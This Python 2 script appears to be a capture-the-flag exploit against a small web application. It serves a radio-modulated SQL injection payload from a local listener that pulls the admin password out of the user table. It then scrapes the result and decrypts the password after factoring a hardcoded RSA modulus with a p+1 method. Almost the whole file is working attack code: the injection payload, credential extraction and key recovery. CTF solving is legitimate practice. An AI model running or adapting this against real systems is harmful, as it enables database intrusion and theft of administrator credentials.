#!/usr/bin/env python
import requests
import threading
import time
import bitarray
import numpy as np

from socket import socket, AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR
from bs4 import BeautifulSoup
from sys import argv


bp = 1 / float(1000000)
sp = bp * 2
sr = 1/sp
f = sr * 2
duration = 100


def constellation(a, b):
    if a == 0 and b == 0:
        return 1, 1
    elif a == 0 and b == 1:
        return 1, -1
    elif a == 1 and b == 0:
        return -1, 1
    else:
        return -1, -1


def modulate(msg):
    a = bitarray.bitarray()
    a.fromstring(msg)
    msg = list(map(int, a.tolist()))

    t = np.arange(sp/duration, sp + sp/duration, sp/duration, dtype=np.float)
    m = np.zeros(0).astype(float)
    for i in range(0, len(msg), 2):
        I, Q = constellation(msg[i], msg[i+1])
        y = I * np.cos(2*np.pi*f*t) + Q * np.sin(2*np.pi*f*t)
        m = np.hstack((m, y))
    return m


HOST, PORT = (None, None)  # ("localhost", 8000)
url = None
myip = "127.0.0.1"


def join(uname, pw):
    data = {'username': uname, 'password': pw}
    r = requests.post(url + 'join.py', data=data)
    return r.text


def login(s, uname, pw):
    data = {'username': uname, 'password': pw}
    r = s.post(url + 'login.py', data=data)
    return r.text


def view(s):
    r = s.get(url + 'view.py')
    return r.text


def view_idx(s, idx):
    r = s.post(url + 'view.py', data={'idx': str(idx)})
    return r.text


def req(s):
    data = {'host': myip, 'port': '5000'}
    r = s.post(url + 'request.py', data=data)
    return r.text


def create_listener(data):
    def socket_routine():
        s = socket(AF_INET, SOCK_STREAM)
        s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
        s.bind(('127.0.0.1', 5000))
        s.listen(1)
        c, addr = s.accept()
        c.sendall(modulate(data))
        c.close()
        s.close()
    t = threading.Thread(target=socket_routine)
    t.start()
    time.sleep(0.5)


def getpq(N):
    from fractions import gcd
    B = 5
    M = 33
    while 1:
        for i in range(1, M + 1):
            x = B
            y = (B * B - 2) % N
            while i != 1:
                if i & 1:
                    x = (x * y - B) % N
                    y = (y * y - 2) % N
                    i = i / 2
                else:
                    y = (x * y - B) % N
                    x = (x * x - 2) % N
                    i = i / 2
            B = x
        if gcd(B - 2, N) != 1:
            p = gcd(B - 2, N)
            return p, N/p
        else:
            B = B + 2


def egcd(a, b):
    if a == 0:
        return (b, 0, 1)
    else:
        g, y, x = egcd(b % a, a)
        return (g, x - (b // a) * y, y)


def modinv(a, m):
    g, x, y = egcd(a, m)
    if g != 1:
        raise Exception('modular inverse does not exist')
    else:
        return x % m


def decrypt(pw, p, q):
    e = 65537
    N = p * q
    phi = (p-1) * (q-1)
    d = modinv(e, phi)
    msg = hex(pow(int(pw, 16), d, N))[2:-1]
    print msg.decode('hex')


def exploit():
    join('asdf', 'asdf')
    s = requests.session()
    s.get(url)
    login(s, 'asdf', 'asdf')
    payload = 'a\'), (\'asdf\', SUBSTR((SELECT password FROM user_tbl where username=0x61646d696e), 1, 1000));--\x01'
    create_listener(payload)
    req(s)
    v_text = view(s)
    soup = BeautifulSoup(v_text, 'html.parser')
    idx = soup.find_all('tr')[1].find_all('td')[0].get_text()
    out = view_idx(s, idx)
    hashed_pw = ''.join(i[51:].strip() for i in out.split('\n'))
    N = 0x52239c9e3f882e3288abe6ee27abd3d018e0c9faa2fb5b4112c670f573588c70073f
    p, q = getpq(N)
    decrypt(hashed_pw, p, q)


if __name__ == '__main__':
    time.sleep(2)
    HOST = argv[1]
    PORT = int(argv[2])
    url = "http://{}:{}/".format(HOST, PORT)
    exploit()
